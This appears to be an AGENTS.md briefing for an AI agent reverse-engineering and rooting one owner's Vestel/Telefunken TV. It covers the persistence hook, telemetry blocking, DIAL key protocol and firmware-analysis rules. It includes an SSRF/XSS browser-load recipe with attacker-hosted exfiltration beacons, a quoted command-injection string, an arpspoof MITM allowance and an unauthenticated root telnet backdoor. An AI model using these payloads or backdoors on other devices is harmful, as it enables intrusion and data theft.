@@ -1,0 +1,287 @@
+# AGENTS.md — tvhack (Vestel MB230 / Telefunken D65U546A)
+
+## Scope
+Single target: `192.168.178.87` (`TELEFUNKEN-TV.fritz.box`, `TELEFUNKEN-TV.local`), MAC `70:54:b4:fe:70:c6` (Vestel). Rear label: `D65U546A / 2199818 / SN 8368599 900143`. Chassis `Vestel_MB230 / MB230_VESTEL`, FW `0.51.52.3`. Do NOT touch other LAN hosts.
+
+## Open work
+Latest next-agent entry point: **`HANDOFF.md`** (2026-10-31), alongside TODO and MEMORY.
+
+Live task list and physical-access blockers: **`TODO.md`**. Read it before starting anything — it tracks the current TV state (online, rooted, vendor UI running), the native openaurora work, the SPI/xboot unlock question and payload/stick maintenance.
+
+**Openaurora scope (owner, 2026-10-31):** reproduce vendor behaviour and quirks,
+but do **not** port telemetry or advertising. Exclude usage/app-click reporting,
+ACR, analytics/tracking SDKs, advertising IDs/profiling, sponsored placements and
+ad delivery, including disabled-by-default implementations. Local diagnostics and
+ordinary TV/network functions remain in scope. This exception takes precedence
+over the parity-first instructions below; it does not descope other TV features.
+
+**Owner constraint (latest): TV is in use. Remote access and read-only diagnostics
+are allowed; do not interrupt operation. No on-set writes/deployment, service
+restarts, network changes, keys, suspend or reboots until re-authorized.
+Owner explicitly authorized temporary `/tmp` staging for the read-only runtime
+preflight; this test has passed and staging was removed, without installing ABI 2.
+Use `tools/tvssh.sh` for TV access (owner preference, including WoL if needed).
+Use offline extraction for firmware files rather than waking the TV just to read them.**
+
+**Standing owner authorization: using the TV to interrogate it is always allowed
+when the operation is view-only.** This includes inspecting files, processes,
+logs and existing state, and firmware-understood GET-only device queries.
+No additional confirmation is needed for those reads while the TV is in use.
+Use `tools/tvssh.sh` for access. This does not authorize changing settings,
+drawing, sending remote keys, taking hardware ownership, restarting services or
+rebooting. Continue to establish device-query semantics from firmware first.
+
+## CURRENT STATE (2026-10-30): ROOTED VIA SSH
+- **LATEST — RECOVERED AND VERIFIED (2026-10-31 20:02):** SSH key login and root
+  telnet work again at .87 after the owner restored image
+  `994da7ff76a0b2fbafb8f6fa0c682627` using the exact old 584-byte script
+  (`de1591298d633cf6422a1ade4e8835a9`), in `artifacts/recovery-stability/`.
+  Hook MD5 `0b1cd32a9de2b0251f6252e6603db8b7`; keepalive MD5
+  `4ebd0f9d7ee9f470afde8b0f2807522b`. One maintenance loop repairs SSH/telnet,
+  home/key permissions, hosts/Samba block, privacy/internet/WoL flags and Ethernet/DHCP.
+  All were checked after recovery; prior independent listener-restart tests passed.
+  Stock UI pinned with `/conf/oa_safe`; native/web boot disabled. Leave the TV alone.
+  See `artifacts/reports/STABILITY-2026-10-31.md` and MEMORY for the deployment error.
+  Never combine an stdin-streamed upload and an asynchronous reboot in one shell
+  AND-list: trailing `&` can send the upload's stdin to /dev/null. Verify installed
+  size/hash in a separate successful call before any separately scheduled reboot.
+- **2026-10-31 continuation:** `oa-supervise` + host-loop heartbeat and SIGTERM fix deployed;
+  boot hook md5 `0b71c42f7b0fdfca2dd6cde78ae17de5`. Native boot remains **disabled**
+  (`/conf/oa_boot` absent), web launcher disabled, vendor UI running. Backups have suffix
+  `.pre-recovery-20261031`. See `openaurora/docs/RECOVERY.md`; images/stick are still older.
+  New offline finding: `_hal_video_drm_kms_init` discovers DRM IDs, **does not SETPLANE**;
+  the 12-word record is documented in `artifacts/reports/DRM-PLANE-CONTRACT-2026-10-31.md`.
+  Further firmware work: `OSD-BUFFER-CONTRACT-2026-10-31.md` proves 131/132 are
+  palette operations and CREATE_DUMB allocates only 4 KiB. Actual OSD uses private
+  GEM allocation. FBIOPAN_DISPLAY commits even without rotation; the missing
+  default present call is fixed/tested **offline only**, not deployed or visibly
+  verified. The large driver is now analysed in `/tmp/opencode/ghidra_nondovi nondovi`.
+  Raw evidence is under `artifacts/analysis/osd-2026-10-31/`; reproducible script:
+  `openaurora/tools/re/DumpFirmware.java` (exact symbols or @hex, optional --asm).
+  **Runtime preflight now exists:** `openaurora --check --modules DIR` validates
+  ELF ABI notes, library paths, symbol versions and relocations without dlopen,
+  constructors, init/start, sockets or hardware calls. Rebuilt ARM core + all eleven
+  modules passed on the actual TV from separately hash-verified `/tmp` staging,
+  then staging was removed. Core MD5 tested: `424ef6ea213cb706acb51a7adb39f778`.
+  Installed older audio/panel/source modules have standalone unresolved V4L2
+  imports; rebuilt modules include the complete closure. Nothing persistent was
+  replaced. See `openaurora/docs/RUNTIME-CHECK.md` and
+  `artifacts/reports/RUNTIME-CHECK-2026-10-31.md`.
+  Owner-requested TODO audit: `artifacts/reports/TODO-AUDIT-2026-10-31.md` supersedes
+  premature completion claims. Thread-post ownership and descriptor-size validation are
+  now implemented in the **offline ABI 2 build**, tested on host, with sanitizers and
+  ARM/qemu; see `artifacts/reports/MODULE-SAFETY-2026-10-31.md`. Default CFLAGS include
+  `-Werror -pedantic` (owner requirement). Core and all modules must be rebuilt together;
+  the TV/recovery build remains ABI 1. IR/display/power/audio/source/full-settings parity is not complete. Three
+  reproduced registry bugs were fixed and regression-tested on host and ARM/qemu.
+- `ssh -i ~/.ssh/id_ed25519 root@192.168.178.87` (or `~/.ssh/id_rsa`, or `~/.ssh/tvhack_tv`) → uid 0. `telnet 192.168.178.87 2323` → unauthenticated root fallback.
+- Persistent across power cycles; depends on nothing but the TV (no laptop, no USB).
+- Mechanism: `apdat0` (`/conf`, UBIFS, **unsigned**) contains `remote.txt` = `0:127.0.0.1:x:x` + `remotelf/{aurora.elf,dropbear,hostkey_*,authorized_keys}`. `remote.txt` makes appmgr load `nvt.app.debug.ini` (`enableMultiuser=n` ⇒ apps run as root); its idtv program is `run_aurora.sh`, whose CIFS mount to 127.0.0.1 fails instantly, so it runs the LOCAL `/conf/remotelf/aurora.elf` as root. That hook restores the real MAC + DHCP, mounts devpts, bind-mounts a patched `/etc/passwd` (root home `/tmp/tvh_root`), starts dropbear:22 + telnetd:2323, starts dialserver standalone (`/vendor/com.nvt.dial/com.nvt.dialserver`, kill switch `/conf/no_dial`) so DIAL 56789/56790 work again, logs to `/conf/tvhack.log`, then execs the real UI.
+- Gotchas: dropbear `-c /bin/sh` is a FORCED COMMAND flag (breaks `ssh host cmd`) — never use it here. Home dir must be 700 or pubkey auth is refused (`umask 077; chmod 700 /tmp/tvh_root` in the hook).
+- Streaming apps (`com.nvt.cobalt`/YouTube etc.) stay disabled by `nvt.app.debug.ini`, though the launcher still shows Netflix etc.; DIAL is restored independently (see below); IP/MAC unchanged (`.87` / `70:54:b4:fe:70:c6`).
+- Artifacts: `artifacts/payload/` (apdat0_full.ubifs, apdat0_orig.ubifs, aurora.elf, hosts, dropbear, keys, authorized_keys, remote.txt, README), `artifacts/scripts/*.scr` (nand_dump, noop_write_apdat0, apply_apdat0_hook, restore_apdat0, restore_full_nand) + `flash_image.sh` (dd the raw mtd13 image), `make_nand_image.sh` (merge it into a 512 MB NAND image), `make_stick.sh` (U-Boot stick), `extract_from_dump.sh` (offline file extraction from the NAND dump), `payload/apdat0_mtd13.img` (raw 10 MB apdat0 partition, dd-able, md5 `875804842f4bb6fd71dd2c6097080edd`), `artifacts/dumps/tv_nand.bin` (pristine 512 MB, md5 `36de1801478ce38c8042845374add41d`) + `split_for_usb.sh` to regenerate `n00..n63.bin`, `artifacts/privacy/` (settings DB variants), `artifacts/profiles/`, `artifacts/protocol/` (keymap XMLs + proof screenshots), `artifacts/reports/*.md` (telemetry, OTA, aurora influence, DIAL/keys/screen). Tools: `tools/tvssh.sh`, `tools/tvshot.py` (framebuffer screenshot), `tools/tvsim.py` + `tools/tvsimctl.sh` (**offline** TV simulator: static host + CGI shims + fake DIAL/WS + headless Chromium, so the launcher can be tested without the set — see `artifacts/reports/TVSIM-2026-10-30.md`), `tools/launcher.sh` (open/close/sleep/status the web launcher), `tools/ensure_awake.py`, `tools/wol.py`, `artifacts/scripts/rebuild_payload.sh`. Web launcher source: `launcher/` (repo, deployed to `/buffer/launcher`).
+- **Reading files does not need the TV**: everything (rootfs, `/vendor`, `/vendor2`, kernel, secos) is inside
+  `dumps/tv_nand.bin` — `artifacts/scripts/extract_from_dump.sh vendor:/path` carves mtd12 (`fs0`), pulls the
+  UBI volume out, `unsquashfs`es it into a cache and copies the file (verified byte-identical to what was
+  pulled over ssh). Use this instead of waking the set for a library or asset.
+- Medion MD30010 firmware, rootfs extracts and the old SSRF probe scripts/logs were deleted on 2026-10-30 (no longer needed — the payload is built from the TV's own dump).
+- Standby: TV sleeps ~3 min after boot on no-signal (HDMI1). Wake it with `tools/tvssh.sh` /
+  `tools/ensure_awake.py` (magic packet), or `tools/wol.py`.
+- Restore: copy `restore_apdat0.scr` → `kylo_usb_update.scr` on a FAT32 stick, TV off, hold OK, reconnect power (~2 min). Full NAND restore is the last resort (`restore_full_nand.scr` + `n00..n63.bin`).
+- **Older recovery images need the protection payload reinstalled** (measured 2026-10-31): an old
+  image restored a 135-line hook
+  that has **no telemetry blackhole, no `dialserver`, no Samba block and no privacy force** — the set
+  comes back rooted but unprotected. After a restore: upload `artifacts/payload/hosts` to
+  `/conf/remotelf/hosts`, install `artifacts/payload/aurora.elf` as `/conf/remotelf/aurora.elf`, then
+  verify `hosts bind: 0`, `dialserver: <pid>`, `db internet flag forced: 1` and
+  `/vendor/iptables -L OUTPUT -n | grep 216.183.117` in `/conf/tvhack.log`. Also check
+  `authorized_keys` still contains the laptop key and `/tmp/tvh_root` is 700 (dropbear refuses pubkey
+  auth on a world-writable home).
+  The current 8 GB TVHACK stick has the newer `994da7ff...` image, including keepalive,
+  privacy protection and working keys; it was used and verified successfully. Raw mtd13
+  and pre-stability backup images are still older. Verify hashes before choosing an image.
+
+## Telemetry findings (2026-10-30, full report: `artifacts/reports/TELEMETRY-2026-10-30.md`)
+- Active egress from `aurora.elf`/`cidclient`: `plog.vstlsrv.com` (Vestel product telemetry, 24 h poll + event logs: heartbeat, usage, channel/source, settings, wifi, storage), `orion.portaltv.tv` (app list/notifications/**appclicks**, all with `macaddr=`), `7345023508.fxm9485766783.com` (Hetzner video-search backend, `q=…&macaddr=`), Google CSE + YouTube Data API (embedded API keys), Samba TV `fsui.cid.samba.tv` (CID bootstrap only), plus a **plain-HTTP** OTA probe to `s3-eu-west-1.amazonaws.com/vstlupdate/Essentials/2kb.txt`.
+- **ACR is disabled** on this set (`/buffer/samba/sambatvCid.json` → `enabled:false`; `localhost:8080/acr_enabled` → `false`), though cidclient keeps a TLS session to Samba TV.
+- Consent flags in `settingsDB.db`: marketing profile = 1, third-party sharing = 1, advertising = 1, ads storage = 1, samba = 0.
+- **2026-10-30: advertising / personalized ads / marketing profiling / 3rd-party sharing switched OFF** in `Settings` (`m_privacy_*` = 0, DNT = 1), verified after reboot. Edited offline and pushed atomically; artifact `artifacts/privacy/settingsDB.privacy-off.db` (md5 `6f6916a6d00ba5a5d4b4c07898e51b3b`), and `artifacts/payload/apdat0_full.ubifs` rebuilt from the live `/conf` (md5 `76b1464a4b70566b014a58ac39ef795b`). Re-applied 2026-10-30 and persisted; hook also blocks Samba TV by IP (`iptables -d 216.183.117.0/24 -j REJECT`).
+- Device IDs seen: MAC `70:54:b4:fe:70:c6`, advertising ID `71613941-14eb-49f5-a310-a3505c0867f8`, pseudonymous user ID `u22162473093285252`, Gracenote ID in `/conf/gracenote_user_id`, DIAL UUID.
+- Alexa/Google Assistant **not linked** (no `/conf/aws_iot_certs`, `AlexaReadyTable.m_fti_flag=0`) → `user_identity` MQTT message (serial_no, both MACs, BT addr, cognito/advertising IDs) is built but not emitted.
+
+## Protocol cheatsheet (verified, stock firmware)
+- DIAL desc: `GET http://192.168.178.87:56790/dd.xml` → check `Application-URL` header (`http://192.168.178.87:56789/apps/`).
+- DIAL app: `GET/POST http://192.168.178.87:56789/apps/SmartCenter`. Any body returns `201` — meaningless alone.
+- **Authoritative keymap on the TV** (no guessing): `/vendor/vk_keymapping_db.xml` (the codes used below),
+  `/vendor/ice_keymapping_db.xml` (internal ICE variants), `/vendor/dial_appname_to_prefixurl_list.xml`
+  (app names DIAL accepts). Copies + table: `artifacts/protocol/`, `artifacts/reports/DIAL-KEYS-SCREEN-2026-10-30.md`.
+- Send key: `POST /apps/SmartCenter` body `<?xml version='1.0' ?><remote><key code='XXX'/></remote>`, headers `Content-Type: text/plain; charset=ISO-8859-1`, `application_name: tv smart centre`.
+  Codes: digits 0–9 = 1000–1009, `KeyExit` 1010, `KeyPower` 1012, MUTE 1013, VOL_UP 1016, VOL_DOWN 1017,
+  INFO 1018, **DOWN 1019, UP 1020, LEFT 1021, RIGHT 1022**, STOP 1024, PLAY 1025, PROGRAM_UP 1032,
+  PROGRAM_DOWN 1033, `KeyExit2` 1037 (what the remote's EXIT sends), EPG 1047, MENU 1048, OK (`KeySelect`) 1053,
+  `KeyAux`/source 1056, Netflix 1064. `Keyboard*` codes (8, 32, 48–57, 65–90, 97–122…) drive text entry.
+- Launch app: `POST /apps/<name>` from the `dial_appname_to_prefixurl_list.xml` set (`YouTube`, `Netflix`, `vr`, …).
+  Returns 201, but apps disabled in `nvt.app.debug.ini` do not actually start.
+- Query: `POST /apps/SmartCenter` body `<command>tvstate</command>` (bare `tvstate` also works). Reply arrives on WebSocket, NOT in POST response.
+- **Standby:** `POST /apps/SmartCenter` body `<command>Standby</command>` — the TV suspends and drops the TCP connection (curl reports `000`), all ports close. Bring it back with `tools/tvssh.sh` (WoL). The `KeyPower` (1012) remote key via DIAL is ignored.
+- State WS: `ws://192.168.178.87:7681/` with `Origin: http://192.168.178.87` header. Pushes state **once on connect** and then only on change — a silent socket is normal, not a failure.
+- **Screenshot over SSH** (best oracle for "did the key/command land"): root can read the OSD layers —
+  `tools/tvshot.py` dumps `/dev/fb1` (launcher/menus, 1920×2160 = 2 frames, RGBA) or `--layer 0` (apps)
+  to PNG. All-zero = nothing drawn on that layer (normal on the no-signal source).
+- Browser load (SSRF/XSS): `POST /apps/SmartCenter` body `<?xml version='1.0' ?><browserseturl><load url='http://<attacker>:<port>/' page='RC'/></browserseturl>` (same headers). TV Opera browser fetches it; UA contains `Model/Vestel-MB230 ... _TV_NT72671_2019`. Host exfil JS on attacker port, collect `/exfil?m=` beacons. Restores UI with `EXIT,BACK` keys afterwards.
+- Loopback from TV browser: `127.0.0.1:56789,56790,2870,8080` open (8080 CORS-enabled, paths unknown — 33 common paths all 404); rest closed. Do NOT assume 201 = executed.
+
+## UI stack (see `artifacts/reports/UI-STACK-2026-10-30.md`)
+- No X/Wayland/Qt. `aurora.elf` is a **DirectFB 1.7** app: `system=fbdev` (mmap on `/dev/fbX`),
+  gfxdriver `libdirectfb_tdga.so`, wm `sawman`, IR input via `libdirectfb_nvt_uart_ir.so`;
+  config `/vendor/etc/mp/.directfbrc` (1920x1080 ARGB32, layer 0 = OSD_NORMAL1, layer 1 = OSD_NORMAL2).
+- It owns fb0..fb4 + `/dev/mali0` + `/dev/dri/card0`. Launcher/menus → **fb1** (2x1080 frames,
+  RGBA); fb0 = app/video OSD (transparent when idle); fb2 = 1280x720 16bpp, apparently free;
+  fb3/fb4 = hardware cursor planes.
+- Theme = data: `/vendor2/dynamic_ui` (`default.ui`, `telefunken18_{svg,img,font}.bin` + `.txt`
+  indexes). Web apps run in the OMI/Opera engine (`libomi.so`, `/vendor/browser_dir/omi_worker`,
+  no fb fd — aurora composites them).
+- Painting the screen from root works (wrote+restored a test box in fb1); honour the multi-frame
+  buffering and expect DFB to repaint over stray pixels. **Every 32bpp OSD layer is BGRA** (`byte0` =
+  blue), proven with `tools/colorbars` — the older "fb0 is BGRA, fb1 is RGBA" claim came from
+  `tvshot.py` mis-decoding fb1 and is wrong; it had red/blue swapped in every reference capture
+  until 2026-10-31 (`artifacts/reports/UI-PARITY-2026-10-31.md`).
+- **The launcher is now the real OmarchyTV app** (`launcher/omarchy/`, upstream `webos/app` + a
+  `platform.js` vestel shim). The hook boots into `/omarchy/`; the P1 mock stays at `/` as a fallback.
+  The app scales its own 1920x1080 `#stage` (`fitStage`), so the viewport meta must stay
+  `width=device-width` and no extra transform may be applied. Port notes:
+  `artifacts/reports/P3-OMARCHYTV-PORT-2026-10-30.md`.
+- A web launcher is proven and now **boots with the TV**: `launcher/` (P1 mock) is served from
+  `/buffer/launcher` by busybox `httpd -p 8181`; the hook opens `http://127.0.0.1:8181/omarchy/` with
+  `browserseturl` once the portal is up (`http://127.0.0.1:8181/` still serves the P1 mock). Tiles drive the TV through the CGI → DIAL key path; the
+  **browser eats TV-control keys**, so scripts send EXIT first and the intended key ~1 s later.
+  - `/conf/launcher_enable` = opt-in (currently set); `/conf/launcher_ok` = page rendered;
+    `/conf/launcher_fail` = failed boots, **3 = auto-disable** (lock-out guard, tested).
+  - Host control: `tools/launcher.sh open|close|status`; `tools/portal_tile.sh add|remove|status`
+    (re-entry tile). Reports: `P0-BROWSER-PROBE`, `P1-MOCK-LAUNCHER`, `P2-BOOT-INTEGRATION`,
+    `P2b-PORTAL-TILE`, `LAUNCHER-PLAN` in `artifacts/reports/`.
+- **Re-entry**: the stock portal's tiles are rows in `settingsDB.db` → `LauncherItem`
+  (`m_item_type=2`, `m_parent_id` 1=Home/0=Apps, `m_application_url`, `m_application_thumb_url`,
+  `m_order_index`). Two rows with `m_original_id=900000` put an "OmarchyTV" tile first; OK opens the
+  launcher. Needs a reboot after editing; back up the DB first (`settingsDB.db.pre-tile`).
+
+## Ports (external view)
+- Stock: `2870` DLNA, `7681` WS, `12345` Robotest (broken: accepts then closes), `26442`/`33907` silent tarpits, `56789/56790` DIAL. Closed: `22,23,1986,4725,5001,8080,9222,7001`.
+- **Current rooted state:** `22` (dropbear, key auth), `2323` (telnetd, root, no auth), plus `2870,7681,12345,26442`, and **`56789/56790` DIAL back up** (dialserver started standalone from the hook; kill switch `/conf/no_dial`). Loopback-only: `8080` (cidclient ACR), `26441`.
+- Re-check with `python3 -c socket.create_connection` (fast) before claiming anything changed; full `nmap -sV` times out on the weird ports.
+
+## Safety rules
+- **Any process crash resets the set, by design** (measured 2026-10-31): the kernel core pattern is
+  `| /usr/sbin/core_helper.sh gzip %p %e %t`, and that script — when `/conf/coredumpnoreset` does not
+  exist — calls `before_system_reset` (umount + `ubidetach` `/mtd_rwarea`, `/conf`, `/buffer`) and then
+  `pcbconfig -i -w 1`, i.e. it arms the MCU watchdog at **1 s** with nothing left to kick it. That is
+  what "the TV bricked" looked like every time a probe segfaulted
+  (`/conf/always_logging_reset_count` counts them). **`/conf/coredumpnoreset` is the documented
+  off-switch** (it makes the handler call `pcbconfig -i -w 0` instead); it is set on this set for
+  development. **Verified**: with the flag set, a deliberate `SIGSEGV` left the set running (uptime kept
+  advancing, `always_logging_reset_count` 2→3, `dmesg` showed `[COREDUMP] SIGNR:11`, aurora and DIAL
+  still up). `/conf/enable_coredump` controls whether cores are written to USB at all.
+- The same file explains the other boot-time reset path: `/vendor/run.sh` starts `trigger_reboot &`,
+  which waits for `/tmp/trigger_reboot` and then `pkill -f aurora.elf`, `pcbconfig -i -w 10`, detaches
+  the partitions and runs whatever command the file names. Not a supervisor — a trigger.
+- **The MCU watchdog is controllable from userspace** (`artifacts/reports/PANEL-TAKEOVER-2026-10-31.md`):
+  vendor aurora is what feeds it, so `SIGSTOP`/`kill` of aurora used to reset the SoC. Run
+  `/buffer/wdtctl disable` first (tool: `openaurora/tools/mcu/wdtctl.c`) and the set stays up with
+  aurora stopped. It writes the 6-byte packet `{0,0xae,0,0,0,0xae}` to `/proc/nvtstbcipc`
+  (`{0,0xae,hi,lo,1,0xae}` = set timeout). Do **not** try to reach the watchdog through
+  `libNDAL_EX`'s `NDAL_VideoExt_STBC_*` calls — that resets the set (half-initialised MCU path).
+  With the watchdog disabled, killing aurora leaves it dead (appmgr does not respawn), so a reboot
+  is how you get the stock UI back.
+- Signed/verified at boot: `fs0`, `ap0`, `ap1` (`nvt_sign` volume; kernel `rootflags=nvt_security` → "UBI Security Verify volume Fail … goto shutdown"). **Never patch them** — the TV will refuse to boot.
+- Safe write target: `apdat0` (`/conf`), unsigned, UBI volume 31 × 253,952 B at NAND `0xe340000`. Always keep `apdat0_orig.ubifs` for revert.
+- U-Boot auto-script channel (`hold OK` + `kylo_usb_update.scr`, <8 KB, must end with `%`) is the recovery path; it lives in xboot/U-Boot which we never write.
+- Keys change on-screen UI — visible to owner. Prefer SSRF/WS/description reads. If keys sent, close with `EXIT,EXIT` / `BACK`.
+- Never flash firmware without exact `VESxxx` panel match + official `upgrade_mb230.bin`. Encrypted + Secure Boot on MB230; mismatch = brick.
+- No long MITM: 60s targeted `arpspoof -t <tv> <gateway>` max, IP forwarding on, stop afterwards. Prior capture was empty — don't repeat without reason.
+- Firmware is copyrighted (Vestel/Telefunken). Don't redistribute dumps. Request via `service.vestel.com / telefunken.com/service` with model+serial+panel.
+- Kill background probe servers in `/tmp/opencode/exfil*.py` when done (use exact `pkill -f` in a separate shell call to avoid self-kill; the `[e]` trick still matches later args in same command line).
+- On this host `ssh` is wrapped with OnConnect hooks that break non-interactive command execution — use `/usr/bin/ssh -F /dev/null …`.
+
+## Firmware is the source of truth (rule added 2026-10-30)
+
+The vendor binaries and libraries ship **unstripped**, so most questions have an authoritative
+answer before anything is run on the set. Read it first:
+
+* extract the file from the dump — `artifacts/scripts/extract_from_dump.sh vendor:/lib/<lib>` /
+  `root:<path>` (no TV needed);
+* open it in Ghidra — `/tmp/opencode/ghidra_proj` has `aurora.elf` analysed,
+  `/tmp/opencode/ghidra_ndal3` has `libNDAL3.so`;
+* `libNDAL3.so` (643 `Hal_*`) and `libNDAL_EX.so` (160 `NDAL_*`) are the only reusable vendor
+  surface; `PLAT_*`/`DEV_*`/`ICE_*` live inside `aurora.elf`.
+
+**Check Ghidra/disassembly before trying anything on the set** (rule added 2026-10-31). Before a
+reboot, a device probe, an ioctl, or any "let's see what happens": answer the question from the
+binaries, the driver or the kernel first. Scripts are in `/tmp/opencode/ghidra_scripts`
+(`DumpStringXrefs`, `DumpFuncs`, `DumpCallers`, `DumpPltCallers`), and `analyzeHeadless` is at
+`/opt/ghidra/support/analyzeHeadless` (Java scripts only — no Jython). Two cases from 2026-10-31 that
+cost reboots: framebuffer registration, device-node creation and OSD presentation
+were conflated. **Corrected by driver decompilation:** KER_OSD_DrvInit allocates
+and registers all five framebuffers; visible enable/commit is a separate path
+(`artifacts/reports/OSD-KERNEL-INIT-2026-10-31.md`). Also, the
+32-byte OSD region layout is fixed by `NVTGA_OSD_SetRegion`. On-set probing is for *confirming* what
+the code already predicts — and prefer reading driver state back (`tools/mcu/fbregion.c`) over
+drawing test patterns.
+
+**Probing on the set is for confirming behaviour, never for discovering an API.** The PWM episode is
+the cautionary tale: `Hal_Pwm_Set_ByChannel` was assumed to take a three-word
+descriptor, omitting its mode word. The recovered request has four words
+`{freq, duty, shift, mode}`, with mode < 9. **Return correction (2026-10-31):**
+the saved Ghidra prototype says void, but ARM return instructions prove a scalar
+result (r6 → r0 at 0x4e7c1056); Open likewise returns r8 → r0 and reads six words.
+The result alone is not a hardware-write acknowledgment. Use the maintained
+`openaurora/include/openaurora/vendor_pwm.h` and
+`artifacts/reports/PWM-CONTRACT-RECHECK-2026-10-31.md`, not older void-return claims.
+
+Same for the display: the fbdev/tdga ioctl set was read out of `libdirectfb_tdga.so`, which is why
+`FBIOPAN_DISPLAY` and the region ioctl were known before touching the panel.
+
+The firmware is also immutable for us, so the extracted libraries are a stable link target
+(`openaurora` links them directly; see `openaurora/docs/ARCHITECTURE.md`).
+
+**Everything, including `/conf`, is in the dump.** `apdat0` (`/conf`) is not one of the volumes
+`extract_from_dump.sh` knows, but it is carved from the same image:
+
+```sh
+python3 -c "d=open('artifacts/dumps/tv_nand.bin','rb'); d.seek(0xE340000); \
+            open('/tmp/apdat0.bin','wb').write(d.read(0xA00000))"
+/tmp/opencode/venv/bin/ubireader_extract_files -o /tmp/apdat0_x /tmp/apdat0.bin
+# -> /tmp/apdat0_x/<id>/apdat0/  … settingsDB.db, mb230_hwprofile.bin, PCF.pcf, PQF.bin, …
+```
+
+Verified: the dump's `mb230_hwprofile.bin` is byte-identical (md5 `1b063b2c…`) to the copy pulled from
+the running set, so device data never needs the TV to be awake. The live `settingsDB.db` differs from
+the dump only by our own edits (privacy flags, the OmarchyTV tile).
+
+**Parity first, then change it.** openaurora's first target is to behave exactly like the vendor
+`aurora` — same screens, same remote behaviour, same assets — and only then to diverge on UI/UX. That
+means the *content* comes from the firmware too, not from guesswork:
+
+* **theme / chrome / artwork** — `/vendor2/dynamic_ui` (`default.ui`, `telefunken18_{svg,img,font}.bin`
+  + their `.txt` indexes), plus `/buffer/logo.jpg`, `/buffer/bootlogo.jpg` and the app tile icons
+  referenced from `settingsDB.db → LauncherItem`;
+* **strings / labels** — the `slim_i18n` tables and the `NovoSystemInformationProvider` getters
+  (`getHdmi1Name`, `getExt1Name`, …) that feed the source list;
+* **key behaviour** — three pieces, all in the firmware:
+  1. `libdirectfb_nvt_uart_ir.so`: `nec_keycode_map` (52 NEC codes) → `custom_keycode_map` (DFB symbols);
+  2. `/vendor/ice_keymapping_db.xml`: `KeyString` → **ICE keypress id** (512+);
+     `/vendor/vk_keymapping_db.xml`: `KeyString` → DIAL/virtual-remote code (1000+);
+  3. **the per-key codes come from the device profile**, not from any binary: `/conf/mb230_hwprofile.bin`
+     (24,514 B, EFSL container; copy in `artifacts/protocol/mb230_hwprofile.bin`). This is why no static
+     `{code, id}` table exists. The map is already recovered — `artifacts/reports/IR-KEYMAP-2026-10-30.md`
+     + `artifacts/protocol/ir-keymap-2026-10-30.csv` (ICE id → KeyString → RC code, 143 rows), read out of
+     the running process at `*0x77ae5c` (aurora is `ET_EXEC`), so no EFSL parsing is needed.
+* **layout numbers** — the `.ui`/`.txt` packs carry the geometry the stock UI uses; replicate those
+  values for parity instead of eyeballing screenshots.
+
+## Toolchain (already installed)
+`nmap, tcpdump, dsniff/arpspoof, binwalk, poppler (pdftotext), python3 http.server, /tmp/opencode/mstar-bin-tool/{unpack,pack,extract_keys}.py, /tmp/opencode/MB230_manual.pdf + .txt`. `unpack.py` has no `--help`.
+Added 2026-10-30: `squashfs-tools`, `mtd-utils` (ubinize/mkfs.ubifs/ubiformat/ubiattach), `samba`, `qemu-arm-static`, cross toolchain `/tmp/opencode/arm-linux-musleabihf-cross` (GCC 11.2.1), `ubi_reader` in `/tmp/opencode/venv`, dropbear 2024.86 source at `/tmp/opencode/dropbear-2024.86` (build: `make dropbear LDFLAGS="-static -no-pie -s"`).
+
+## Key references
+- Service manual: `17MB230` = Novatek NT72671TBG, NAND MT29F4G08 (512MB), SPI KH25L1606 (2MB), update = `kylo_usb_update.* + upgrade_mb230.bin`, hold OK on power-on.
+- Docs: hass-vestel-tv `api.py` (correct SmartCenter XML), 0DRG Hacking_A_Vestel_TV (WiDi `';sh</mnt/hd0a/a &'`), Terence Eden 4725 menu, Vestel CC Security Target (OTA TLS+signed+encrypted).
